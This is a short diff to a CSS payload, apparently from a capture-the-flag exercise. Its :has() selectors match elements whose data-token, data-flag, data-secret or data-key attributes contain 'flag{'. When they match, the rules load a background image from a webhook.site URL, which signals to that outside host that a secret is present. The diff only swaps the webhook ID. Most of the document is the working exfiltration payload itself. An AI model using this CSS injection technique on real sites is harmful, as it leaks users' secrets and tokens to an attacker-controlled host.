@@ -12,5 +12,5 @@ html:has([data-token*="flag{"]),
 html:has([data-flag*="flag{"]),
 html:has([data-secret*="flag{"]),
 html:has([data-key*="flag{"]) {
-  background-image:url(https://webhook.site/87ef22b5-7d72-43c5-8d86-ada8cdf62e1c?found=flaglike);
+  background-image:url(	https://webhook.site/11e4badb-e5de-41af-817a-234a883715fb?found=flaglike);
 }
